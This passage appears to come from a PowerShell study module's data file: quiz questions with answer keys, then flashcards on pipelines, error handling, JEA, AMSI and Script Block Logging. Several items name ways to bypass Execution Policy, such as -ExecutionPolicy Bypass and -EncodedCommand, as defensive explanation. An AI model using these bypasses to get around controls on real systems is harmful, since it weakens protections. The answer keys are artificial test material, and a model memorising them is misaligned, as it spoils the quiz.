    { q: "What is the defining difference between the PowerShell pipeline and a Unix/bash pipeline?", options: ["PowerShell is faster", "PowerShell passes structured .NET objects between cmdlets, while bash passes unstructured text", "PowerShell only works on Windows", "Bash supports more commands"], answer: 1, explain: "The pipeline carries fully-formed objects with named properties and methods, so you filter and select on real properties instead of re-parsing text columns with awk/cut. This is PowerShell's killer feature." },
    { q: "Which command tells you every property and method an object exposes?", options: ["Get-Help", "Get-Command", "Get-Member", "Get-Process"], answer: 2, explain: "Pipe any object into Get-Member to X-ray it: every property you can Select-Object and every method you can call. Get-Command finds cmdlets; Get-Help explains usage." },
    { q: "Your try/catch block isn't catching an error from a cmdlet. Why?", options: ["PowerShell doesn't support try/catch", "The error is non-terminating; catch only handles terminating errors — add -ErrorAction Stop", "You need to reboot", "try/catch only works in PowerShell 7"], answer: 1, explain: "Most cmdlets raise non-terminating errors that bypass catch. Promote them with -ErrorAction Stop on the cmdlet or $ErrorActionPreference='Stop' for the scope." },
    { q: "Is the PowerShell Execution Policy a security boundary?", options: ["Yes, it fully blocks malicious scripts", "No — it is a safety/convenience feature, trivially bypassed (e.g. -ExecutionPolicy Bypass, -EncodedCommand)", "Yes, but only in PowerShell 7", "It encrypts scripts"], answer: 1, explain: "Microsoft documents Execution Policy as a guardrail against accidental script execution, not a security control. Bypass, piping to stdin, and -EncodedCommand all sidestep it." },
    { q: "Which legacy PowerShell modules were retired in 2025, and what replaces them for identity?", options: ["Az and ExchangeOnlineManagement; replaced by MSOnline", "MSOnline and AzureAD; replaced by the Microsoft Graph PowerShell SDK (Connect-MgGraph)", "Microsoft.Graph; replaced by AzureAD", "PowerShell 5.1; replaced by PowerShell 7"], answer: 1, explain: "MSOnline (Msol*) and AzureAD (AzureAD*) were retired in 2025. Use the Microsoft Graph PowerShell SDK (Connect-MgGraph, *-Mg* cmdlets) for Entra ID, and the Az module for Azure resources." },
    { q: "What is AMSI (the Antimalware Scan Interface)?", options: ["A firewall rule set", "An interface that lets script hosts submit code to the registered AV for inspection right before execution — even fileless/decoded code", "A PowerShell execution policy", "A logging channel"], answer: 1, explain: "AMSI hands script content to Defender at execution time, so it can catch in-memory and de-obfuscated payloads. Attackers invest heavily in AMSI bypasses precisely because it works." },
    { q: "Which log records malicious PowerShell even after it has been Base64-decoded or downloaded in memory?", options: ["The Application log", "Script Block Logging — Event ID 4104 (PowerShell/Operational)", "The Setup log", "DNS logs"], answer: 1, explain: "Script Block Logging captures the de-obfuscated script as actually executed, so encoded commands and download cradles appear in cleartext. Pair it with Module Logging (4103) and Transcription." },
    { q: "How would you let helpdesk restart a service on servers without making them administrators?", options: ["Give them Domain Admin temporarily", "Publish a JEA endpoint with a role allowing only Restart-Service, running as a virtual account with session transcription", "Disable the Execution Policy", "Add them to the local Users group"], answer: 1, explain: "Just Enough Administration (JEA) exposes a constrained, allow-listed command set under a virtual privileged account with full auditing — least privilege plus an audit trail, without standing admin rights." }
  ],
  flashcards: [
    { front: "The #1 difference: PowerShell vs bash pipeline", back: "PowerShell passes <strong>structured .NET objects</strong> (named properties/methods); bash passes <strong>unstructured text</strong> that must be re-parsed with awk/cut. No text-scraping needed." },
    { front: "Cmdlet naming convention", back: "<strong>Verb-Noun</strong> from an approved verb list (Get, Set, New, Remove, Start, Stop...). Predictable names are why discovery works." },
    { front: "The discovery trio", back: "<strong>Get-Command</strong> (what can I run?), <strong>Get-Help</strong> (how do I use it? try -Examples), <strong>Get-Member</strong> (what properties/methods does this object have?)." },
    { front: "Windows PowerShell 5.1 vs PowerShell 7", back: "5.1 = .NET Framework, Windows-only, ships in-box (<code>powershell.exe</code>). 7 = modern .NET, cross-platform, installed separately (<code>pwsh</code>). They coexist; use 7 for new work." },
    { front: "What is $_ (or $PSItem)?", back: "The current object flowing down the pipeline inside a script block. <code>$_.Status</code> = the Status property of the item being processed right now." },
    { front: "PowerShell providers", back: "Data stores exposed as drives you navigate like the file system: <strong>HKLM:\\</strong> (registry), <strong>Cert:\\</strong> (certificates), <strong>Env:\\</strong>. Same cmdlets (Get-ChildItem) work on all." },
    { front: "Why isn't my try/catch firing?", back: "catch only handles <strong>terminating</strong> errors. Most cmdlets throw <strong>non-terminating</strong> ones — promote with <code>-ErrorAction Stop</code> or <code>$ErrorActionPreference='Stop'</code>." },
    { front: "Enter-PSSession vs Invoke-Command", back: "<strong>Enter-PSSession</strong> = interactive shell on one machine (SSH-like). <strong>Invoke-Command</strong> = run a script block on many machines in parallel (fan-out), returning objects tagged with PSComputerName." },
    { front: "What is JEA?", back: "Just Enough Administration — a constrained remoting endpoint exposing only an allow-listed command set, running under a virtual privileged account, with full transcription. Least privilege + audit for delegated admin." },
    { front: "Current cloud modules (and the dead ones)", back: "Use <strong>Microsoft Graph SDK</strong> (Connect-MgGraph) for Entra ID and <strong>Az</strong> (Connect-AzAccount) for Azure. <strong>MSOnline and AzureAD were retired in 2025</strong> — migrate off them." },
    { front: "Is Execution Policy a security boundary?", back: "<strong>No.</strong> It's a safety/convenience guardrail against accidental script runs. Bypassed trivially via -ExecutionPolicy Bypass, stdin piping, or -EncodedCommand. Calling it a security control marks you as a beginner." },
    { front: "What is AMSI and which log catches decoded malicious PowerShell?", back: "<strong>AMSI</strong> submits script content to Defender for scanning right before execution (catches fileless/decoded code). <strong>Script Block Logging, Event ID 4104</strong>, records the de-obfuscated script as it actually ran." }
  ]
});
